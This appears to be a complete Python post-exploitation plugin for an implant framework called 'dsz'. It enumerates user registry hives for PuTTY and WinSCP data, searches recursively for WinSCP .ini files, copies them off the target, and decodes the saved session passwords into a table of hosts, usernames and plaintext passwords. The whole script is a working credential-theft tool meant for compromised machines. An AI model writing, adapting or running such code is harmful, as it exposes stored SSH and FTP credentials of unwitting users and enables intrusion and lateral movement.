
import os
from collections import defaultdict
import dsz
from ops.pprint import pprint

def main():
    print ''
    dsz.ui.Echo('Pulling all Martin Prikryl and Simon Tatham registry data...')
    grab_all_regdata()
    print ''
    creds = []
    dsz.ui.Echo('Looking for Registry Storage...')
    creds += get_registry_credentials()
    print ''
    creds += get_ini_credentials()
    print ''
    if creds:
        pprint(creds, header=['Host', 'Port', 'Protocol', 'Username', 'Password'])
    else:
        dsz.ui.Echo('No saved passwords found.', dsz.ERROR)
    print ''
    dsz.ui.Echo('SimonTatham.py Done!', dsz.GOOD)

def grab_all_regdata():
    dsz.control.echo.Off()
    data = registry_get_names('', 'U')
    dsz.control.echo.On()
    for key in data:
        if (key == '.DEFAULT'):
            continue
        if key.endswith('_Classes'):
            continue
        if key.startswith('S-1-5-21'):
            dsz.control.echo.Off()
            dsz.cmd.Run(('background log registryquery -hive U -key %s\\software\\simontatham -recursive' % key))
            dsz.cmd.Run(('background log registryquery -hive U -key "%s\\software\\Martin Prikryl" -recursive' % key))
            dsz.control.echo.On()

def registry_getdict(key, hive):
    vdict = defaultdict((lambda : ''))
    cmd = ('registryquery -hive %s -key "%s"' % (hive, key))
    dsz.control.echo.Off()
    if (not dsz.cmd.Run(cmd, dsz.RUN_FLAG_RECORD)):
        return vdict
    if (not dsz.cmd.data.Size('Key::Value')):
        return vdict
    try:
        names = dsz.cmd.data.Get('Key::Value::name', dsz.TYPE_STRING)
        values = dsz.cmd.data.Get('Key::Value::value', dsz.TYPE_STRING)
        vdict.update(dict(zip(names, values)))
    except:
        dsz.ui.Echo(('Failed to get values from regquery for %s' % key))
    dsz.control.echo.On()
    return vdict

def registry_get_names(key, hive):
    dsz.control.echo.Off()
    command = ('registryquery -hive %s -key "%s"' % (hive, key))
    dsz.cmd.Run(command, dsz.RUN_FLAG_RECORD)
    try:
        data = dsz.cmd.data.Get('key::subkey::name', dsz.TYPE_STRING)
    except:
        data = None
    dsz.control.echo.On()
    return data

def get_registry_credentials():
    dsz.control.echo.Off()
    data = registry_get_names('', 'U')
    creds = []
    for key in data:
        if (key == '.DEFAULT'):
            continue
        if key.endswith('_Classes'):
            continue
        sec_loc = ('%s\\Software\\Martin Prikryl\\WinSCP 2\\Configuration\\Security' % key)
        security_key = registry_getdict(sec_loc, 'U')
        masterpw = security_key['UseMasterPassword']
        if (not security_key):
            continue
        if (masterpw and (masterpw != '0')):
            dsz.ui.Echo(('User %s is using a Master Password, cannot recover passwords' % key), dsz.ERROR)
        session_key = ('%s\\Software\\Martin Prikryl\\WinSCP 2\\Sessions' % key)
        saved_sessions = registry_get_names(session_key, 'U')
        if (not saved_sessions):
            dsz.ui.Echo(('Checking user %s - No registry data.' % key))
            continue
        dsz.ui.Echo(('Checking user %s - WinSCP Data Found!' % key), dsz.GOOD)
        for saved_session in saved_sessions:
            if (saved_session == 'Default%%20Settings'):
                continue
            active_session = ('%s\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\%s' % (key, saved_session))
            session_dict = registry_getdict(active_session, 'U')
            portnum = session_dict['PortNumber']
            if (not portnum):
                portnum = '22'
            user = session_dict['UserName']
            host = session_dict['HostName']
            proto = session_dict['FSProtocol']
            proto = protocol_to_string(proto)
            password = session_dict['Password']
            if (not password):
                decrypted_pass = '<NONE SAVED>'
            else:
                decrypted_pass = decrypt_password(password, (user + host))
            creds.append([host, portnum, proto, user, decrypted_pass])
    return creds

def get_ini_credentials():
    if (not dsz.ui.Prompt('Would you like to recursive dir for WinSCP*.ini files?')):
        return []
    dsz.ui.Echo('Looking for WinSCP .ini file storage...')
    dsz.control.echo.Off()
    dir_cmd = 'dir -path * -mask WinSCP*.ini -recursive -max 0'
    dsz.cmd.Run(dir_cmd, dsz.RUN_FLAG_RECORD)
    paths = dsz.cmd.data.Get('diritem', dsz.TYPE_OBJECT)
    path_pairs = []
    for path in paths:
        base_path = dsz.cmd.data.ObjectGet(path, 'path', dsz.TYPE_STRING)
        try:
            name = dsz.cmd.data.ObjectGet(path, 'fileitem::name', dsz.TYPE_STRING)
        except:
            continue
        path_found = os.path.join(base_path[0], name[0])
        dsz.ui.Echo(('Found WinSCP .ini file: %s' % path_found), dsz.GOOD)
        path_pairs.append((name[0], base_path[0]))
    creds = []
    for (name, dir_name) in path_pairs:
        local_path = get_file(name, dir_name)
        if (not local_path):
            continue
        creds += parse_ini_file(local_path)
    return creds

def decrypt_password(pwd, key):
    pwalg_simple_flag = 255
    password = pwd
    flag = decrypt_char(password[0:2])
    password = password[2:]
    if (flag == pwalg_simple_flag):
        password = password[2:]
        length = decrypt_char(password[0:2])
        password = password[2:]
    else:
        length = flag
    ldel = (decrypt_char(password[0:2]) * 2)
    password = password[2:]
    password = password[ldel:len(password)]
    result = ''
    for ss in xrange(length):
        decrypted = decrypt_char(password[0:2])
        password = password[2:]
        if decrypted:
            result += chr(decrypted)
    if (flag == pwalg_simple_flag):
        result = result[len(key):len(result)]
    return result

def decrypt_char(two_chars):
    pwalg_simple_magic = 163
    pwalg_simple_string = '0123456789ABCDEF'
    if (not two_chars):
        return
    unpack1 = pwalg_simple_string.index(two_chars[0:1])
    unpack1 = (unpack1 << 4)
    unpack2 = pwalg_simple_string.index(two_chars[1:2])
    result = ((~ ((unpack1 + unpack2) ^ pwalg_simple_magic)) & 255)
    return result

def parse_ini_file(filename):
    if (not os.path.exists(filename)):
        dsz.ui.Echo(("Couldn't open WinSCP .ini file: %s" % filename), dsz.ERROR)
        return []
    import ConfigParser
    ini = ConfigParser.ConfigParser()
    ini.read(filename)
    if (ini.has_option('Configuration\\Security', 'MasterPassword') and (ini.get('Configuration\\Security', 'MasterPassword') == '1')):
        dsz.ui.Echo('Master Password Set, unable to recover saved passwords!')
        return []
    if (ini.has_option('Configuration\\Security', 'UseMasterPassword') and (ini.get('Configuration\\Security', 'UseMasterPassword') == '1')):
        dsz.ui.Echo('Master Password Set, unable to recover saved passwords!')
        return []
    creds = []
    for group in ini.sections():
        if ('Sessions' not in group):
            continue
        if ini.has_option(group, 'PortNumber'):
            portnum = ini.get(group, 'PortNumber')
        else:
            portnum = '22'
        host = ini.get(group, 'HostName')
        user = (ini.get(group, 'UserName') if ini.has_option(group, 'UserName') else None)
        proto = (ini.get(group, 'FSProtocol') if ini.has_option(group, 'FSProtocol') else None)
        proto = protocol_to_string(proto)
        if (not ini.has_option(group, 'Password')):
            decrypted_pass = '<NONE SAVED>'
        else:
            password = ini.get(group, 'Password')
            decrypted_pass = decrypt_password(password, (user + host))
        creds.append([host, portnum, proto, user, decrypted_pass])
    return creds

def protocol_to_string(proto_num):
    protocol_map = defaultdict((lambda : 'SFTP (with SCP Fallback)'))
    protocol_map.update({'0': 'SCP', '2': 'SFTP (with no SCP Fallback)', '5': 'FTP'})
    return protocol_map[proto_num]

def get_file(remote_file, directory):
    cmd = ('get -mask "%s" -path "%s" -max 0' % (remote_file, directory))
    dsz.cmd.Run(cmd, dsz.RUN_FLAG_RECORD)
    succ = dsz.cmd.data.Get('filestop::successful', dsz.TYPE_BOOL)[0]
    cmdid = dsz.cmd.data.Get('commandmetadata::id', dsz.TYPE_INT)[0]
    if (succ != 1):
        dsz.control.echo.On()
        remote_path = os.path.join(directory, remote_file)
        dsz.ui.Echo(('Get of %s failed, cmdid: %s' % (remote_path, cmdid)), dsz.ERROR)
        dsz.control.echo.Off()
        return None
    local_name = dsz.cmd.data.Get('FileLocalName::localname', dsz.TYPE_STRING)[0]
    full_local_path = os.path.join(dsz.lp.GetLogsDirectory(), 'GetFiles', local_name)
    return full_local_path
if (__name__ == '__main__'):
    main()